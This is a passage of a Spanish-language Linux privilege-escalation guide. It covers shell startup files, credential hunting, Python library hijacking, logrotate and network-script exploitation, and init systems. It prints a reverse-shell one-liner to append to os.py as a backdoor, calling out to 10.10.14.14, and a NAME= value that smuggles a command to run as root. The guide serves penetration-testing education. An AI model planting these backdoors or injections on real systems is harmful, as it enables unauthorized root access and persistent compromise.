~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Búsqueda genérica de credenciales/Regex

También debes verificar archivos que contengan la palabra "**password**" en su **nombre** o en su **contenido**, y también buscar IPs y correos electrónicos dentro de los registros, o expresiones regulares de hashes.\
No voy a enumerar aquí cómo hacer todo esto, pero si estás interesado, puedes revisar las últimas comprobaciones que realiza [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Archivos con permisos de escritura

### Secuestro de biblioteca de Python

Si sabes **desde dónde** se va a ejecutar un script de Python y **puedes escribir dentro** de esa carpeta o **modificar bibliotecas de Python**, puedes modificar la biblioteca del sistema operativo y ponerle una puerta trasera (si puedes escribir donde se va a ejecutar el script de Python, copia y pega la biblioteca os.py).

Para **poner una puerta trasera en la biblioteca**, simplemente agrega al final de la biblioteca os.py la siguiente línea (cambia la IP y el PUERTO):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Explotación de Logrotate

Una vulnerabilidad en `logrotate` permite a usuarios con **permisos de escritura** en un archivo de registro o sus directorios principales potencialmente obtener privilegios escalados. Esto se debe a que `logrotate`, a menudo en ejecución como **root**, puede ser manipulado para ejecutar archivos arbitrarios, especialmente en directorios como _**/etc/bash\_completion.d/**_. Es importante verificar los permisos no solo en _/var/log_ sino también en cualquier directorio donde se aplique la rotación de registros.

{% hint style="info" %}
Esta vulnerabilidad afecta a la versión `3.18.0` y anteriores de `logrotate`
{% endhint %}

Puede explotar esta vulnerabilidad con [**logrotten**](https://github.com/whotwagner/logrotten).

Esta vulnerabilidad es muy similar a [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(registros de nginx),** así que siempre que descubra que puede alterar registros, verifique quién está gestionando esos registros y compruebe si puede escalar privilegios sustituyendo los registros por enlaces simbólicos.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Referencia de vulnerabilidad:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

Si, por cualquier motivo, un usuario puede **escribir** un script `ifcf-<loquesea>` en _/etc/sysconfig/network-scripts_ **o** puede **ajustar** uno existente, entonces su **sistema está comprometido**.

Los scripts de red, como _ifcg-eth0_ por ejemplo, se utilizan para conexiones de red. Se ven exactamente como archivos .INI. Sin embargo, en Linux son \~sourced\~ por Network Manager (dispatcher.d).

En mi caso, el atributo `NAME=` en estos scripts de red no se maneja correctamente. Si tiene **espacios en blanco en el nombre, el sistema intenta ejecutar la parte después del espacio en blanco**. Esto significa que **todo después del primer espacio en blanco se ejecuta como root**.

Por ejemplo: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
### **init, init.d, systemd y rc.d**

El directorio `/etc/init.d` alberga **scripts** para System V init (SysVinit), el **sistema clásico de gestión de servicios de Linux**. Incluye scripts para `start`, `stop`, `restart` y a veces `reload` de servicios. Estos pueden ejecutarse directamente o a través de enlaces simbólicos encontrados en `/etc/rc?.d/`. Una ruta alternativa en sistemas Redhat es `/etc/rc.d/init.d`.

Por otro lado, `/etc/init` está asociado con **Upstart**, un sistema más nuevo de **gestión de servicios** introducido por Ubuntu, que utiliza archivos de configuración para tareas de gestión de servicios. A pesar de la transición a Upstart, los scripts de SysVinit todavía se utilizan junto con las configuraciones de Upstart debido a una capa de compatibilidad en Upstart.

**systemd** emerge como un moderno gestor de inicialización y servicios, ofreciendo características avanzadas como el inicio de demonios bajo demanda, gestión de montajes automáticos y instantáneas del estado del sistema. Organiza archivos en `/usr/lib/systemd/` para paquetes de distribución y en `/etc/systemd/system/` para modificaciones de administrador, agilizando el proceso de administración del sistema.
